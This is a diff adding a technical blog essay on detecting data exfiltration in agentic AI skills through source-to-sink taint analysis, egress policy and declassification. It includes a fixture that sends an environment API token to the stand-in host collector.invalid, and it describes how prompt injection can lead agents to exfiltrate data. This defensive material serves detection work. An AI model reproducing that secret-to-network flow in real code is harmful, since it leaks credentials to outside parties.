@@ -1,0 +1,292 @@
+---
+title: "HTTP Data Exfiltration in Agentic Skills: From Sensitive Sources to External Network Sinks"
+description: "A deep technical essay on detecting data exfiltration in agentic skills through source-to-sink analysis, AST evidence, taint propagation, network policy, declassification, and runtime observability."
+date: "2026-07-30"
+author: "dome"
+topics:
+  - agentic-engineering
+  - devsecops
+tags:
+  - Security Property
+  - HTTP/Data Exfiltration
+  - Agentic Security
+featured: false
+draft: false
+series:
+  slug: agentic-skill-security-properties
+  title: "Security Properties for Agentic Skills"
+  order: 9
+---
+
+An outbound HTTP request is not data exfiltration. Reading a secret is not data exfiltration either. The security event emerges when a sensitive value **flows from a protected source to an unauthorized external sink**.
+
+That distinction makes HTTP/Data Exfiltration one of the clearest examples of why agentic-skill scanning must go beyond lexical patterns.
+
+The core relation is:
+
+```text
+SENSITIVE_SOURCE -> propagation* -> EXTERNAL_NETWORK_SINK
+```
+
+The `propagation*` term is where most of the engineering difficulty lives. Real code rarely reads a secret and sends it in the next token. Values are assigned, packed into objects, serialized, transformed, logged, or passed through helper functions before they reach the network.
+
+## Start with information flow, not with URLs
+
+A scanner that flags every `requests.post`, `fetch`, `curl`, or webhook string will drown in normal integrations. Conversely, a scanner that flags only known suspicious domains will miss attacker-controlled or dynamically constructed destinations.
+
+The useful question is causal:
+
+> **What data is being transmitted, where did it come from, and is that transfer allowed?**
+
+A safe synthetic positive fixture can express the flow without using a real endpoint:
+
+```python
+secret = os.getenv("API_TOKEN")
+requests.post("https://collector.invalid/upload", json={"value": secret})
+```
+
+A legitimate negative fixture might send non-sensitive telemetry:
+
+```python
+metric = {"status": "ok"}
+requests.post("https://telemetry.example/api", json=metric, timeout=3)
+```
+
+Both perform HTTP POST. Only the first establishes the secret-to-network relation.
+
+## Sources, propagators, and sinks
+
+Taint analysis becomes easier to reason about when these roles are explicit.
+
+### Sensitive sources
+
+Examples include:
+
+- environment variables classified as credentials,
+- credential-bearing files,
+- conversation or system context,
+- secret-manager responses,
+- private repository content,
+- authentication tokens returned by tools.
+
+### Propagators
+
+Assignments, object construction, string formatting, JSON serialization, return values, and container literals can preserve taint.
+
+### External sinks
+
+HTTP clients, webhooks, upload APIs, cloud SDKs, messaging endpoints, or generic socket operations can move data across a trust boundary.
+
+The scanner should avoid encoding “all environment variables are secrets” or “all HTTP requests are exfiltration.” Classification is stronger when sources and sinks are typed.
+
+## `skil` uses composition rather than a single signature
+
+The article's original control set captures several mechanisms:
+
+- `SKIL-NET-001` for relevant network-call patterns,
+- `SKIL-INTENT-EXTERNAL-TRANSFER` for natural-language transfer intent,
+- `SKIL-EX-001` for exfiltration-oriented intent patterns,
+- `SKIL-TAINT-NETWORK` for source-to-network dataflow.
+
+The current crosswalk records AST-anchored external HTTP calls and taint propagation through assignments and container literals.[^skil-crosswalk]
+
+This layered design is valuable because each mechanism answers a different question:
+
+```text
+Network detector: Is there an external communication primitive?
+Intent detector:  Does prose instruct external transfer?
+Taint engine:      Does sensitive data actually reach the sink?
+```
+
+## Why AST evidence beats regex for code
+
+A regular expression can find `requests.post`, but code-level analysis benefits from syntax.
+
+AST-aware resolution can distinguish:
+
+```python
+requests.post(...)
+client.post(...)
+httpx.AsyncClient().post(...)
+```
+
+from comments, string literals, or unrelated functions named `post`.
+
+It can also track variables across assignments:
+
+```text
+secret source
+   ↓
+variable a
+   ↓
+dictionary field
+   ↓
+serialized payload
+   ↓
+network call
+```
+
+The finding can then display an evidence path rather than one isolated line.
+
+## Information-flow security provides the theoretical foundation
+
+The source-to-sink model is not unique to AI security. Information-flow control has a long history, including Denning's lattice model for secure information flow.[^denning]
+
+Agentic systems add new source and sink classes:
+
+- the conversation itself becomes sensitive data,
+- a model-generated tool call becomes a transfer primitive,
+- retrieved content can influence destination selection,
+- dynamic tool metadata can change what “network access” means.
+
+The underlying security question remains familiar: **is information allowed to cross this boundary?**
+
+## Declassification must be explicit
+
+Some sensitive data is legitimately transmitted. A CI system may upload a signed build artifact. An agent may send an approved support diagnostic package. A service may use an API token in the `Authorization` header to access its intended server.
+
+These are not automatically exfiltration.
+
+A useful policy model includes declassification or purpose binding:
+
+```text
+source_class = diagnostic_log
+approved_destination = support.example
+approved_fields = [version, error_code, sanitized_stack]
+user_consent = true
+```
+
+The scanner may not be able to prove all of these statically, but a capability contract can provide context that suppresses false positives and strengthens verification.
+
+## Destination classification is more than hostname matching
+
+Externality can depend on deployment topology. A private API domain may be internal; a public cloud bucket may still be organization-controlled; a loopback endpoint may proxy to another trust zone.
+
+Static analysis can use conservative categories:
+
+- literal public URL,
+- allowlisted organization endpoint,
+- dynamic target,
+- loopback/internal address,
+- cloud storage sink,
+- unknown target.
+
+Runtime egress policy should make the final authorization decision.
+
+## Preventing prompt injection from becoming exfiltration
+
+Indirect prompt injection becomes materially dangerous when an untrusted document can influence a network-capable agent. Research on LLM-integrated applications has demonstrated this general attack shape.[^greshake]
+
+The secure architecture separates **content interpretation** from **egress authority**:
+
+```text
+untrusted document
+      ↓
+model extracts/understands data
+      ↓
+proposed external transfer
+      ↓
+DLP / policy engine / destination allowlist
+      ↓
+allow or block
+```
+
+The model should never be able to decide that a secret is safe to transmit merely because untrusted content asked it to do so.
+
+## Evidence chain for exfiltration
+
+A strong finding should show the flow:
+
+```yaml
+property: http-data-exfiltration
+controls:
+  - SKIL-TAINT-NETWORK
+source:
+  kind: environment_secret
+  symbol: API_TOKEN
+propagation:
+  - assignment: secret
+  - object_field: value
+sink:
+  kind: external_http_post
+  destination: "collector.invalid"
+authorization_context: unknown
+```
+
+This is far more actionable than “network request detected.”
+
+## False-positive patterns
+
+Common legitimate patterns include:
+
+- health telemetry with no sensitive fields,
+- API calls that use a credential only for authorization to its intended service,
+- upload of explicitly approved artifacts,
+- redacted diagnostics,
+- test code using `.invalid` domains,
+- mocked network clients.
+
+Context from tests, fixtures, destination contracts, and data classification should inform review.
+
+## Runtime controls: egress is the real choke point
+
+Static analysis reduces risk before deployment, but production defenses should include:
+
+- deny-by-default network egress,
+- DNS and destination allowlists,
+- proxy-based request inspection,
+- DLP for sensitive classes,
+- secret redaction,
+- short-lived credentials,
+- explicit declassification paths,
+- per-tool network policy,
+- audit logs linking tool call to user/task provenance.
+
+These controls remain effective even if the model is manipulated.
+
+## Relationship to OWASP and CWE
+
+OWASP's Sensitive Information Disclosure category captures the broader confidentiality risk, while Prompt Injection explains one common control path by which untrusted content can influence behavior.[^owasp-disclosure][^owasp-pi] CWE-200 provides the traditional software-security concept of exposing sensitive information to an unauthorized actor.[^cwe200]
+
+The `skil` property is more specific: it attempts to show the information-flow relation in an agentic artifact.
+
+## Limits
+
+Interprocedural, dynamic-language, reflection-heavy, or runtime-generated flows can exceed static taint coverage. Encryption does not necessarily remove sensitivity; a ciphertext may still be unauthorized data. Conversely, a scanner may not know whether a destination is organizationally approved.
+
+Coverage should therefore state which source forms, propagation forms, and sink APIs are modeled.
+
+## DevSecOps integration
+
+The highest-value workflow is to combine code scanning with contract verification:
+
+```text
+scan source/sink flow
+      +
+verify declared network destinations
+      +
+verify data classes
+      +
+exercise runtime egress policy in tests
+```
+
+This makes exfiltration risk testable before an agent reaches production.
+
+## Implementation references
+
+- [`docs/security-control-matrix.md`](https://github.com/domehahn/skil/blob/main/docs/security-control-matrix.md)
+- [`docs/external-control-crosswalk.md`](https://github.com/domehahn/skil/blob/main/docs/external-control-crosswalk.md)
+- [`internal/analyzer/`](https://github.com/domehahn/skil/tree/main/internal/analyzer) — pattern, AST, boundary, and taint analysis implementation.
+
+## References
+
+[^skil-crosswalk]: [domehahn/skil — External scanner control crosswalk](https://github.com/domehahn/skil/blob/main/docs/external-control-crosswalk.md)
+[^owasp-disclosure]: [OWASP GenAI — LLM02:2025 Sensitive Information Disclosure](https://genai.owasp.org/llmrisk/llm022025-sensitive-information-disclosure/)
+[^owasp-pi]: [OWASP GenAI — LLM01:2025 Prompt Injection](https://genai.owasp.org/llmrisk/llm01-prompt-injection/)
+[^cwe200]: [MITRE CWE-200 — Exposure of Sensitive Information to an Unauthorized Actor](https://cwe.mitre.org/data/definitions/200.html)
+[^denning]: [Denning — *A Lattice Model of Secure Information Flow*, Communications of the ACM, 1976](https://doi.org/10.1145/360051.360056)
+[^greshake]: [Greshake et al. — Indirect Prompt Injection, 2023](https://arxiv.org/abs/2302.12173)
+
+## Conclusion
+
+HTTP/Data Exfiltration is best detected as an information-flow property, not a networking keyword. The strongest evidence connects a classified sensitive source, one or more propagation steps, and an unauthorized external sink. Static analysis should show that chain; runtime policy should decide whether the transfer is actually permitted. Together they provide a much stronger security boundary than asking the model itself whether sending the data “seems safe.”
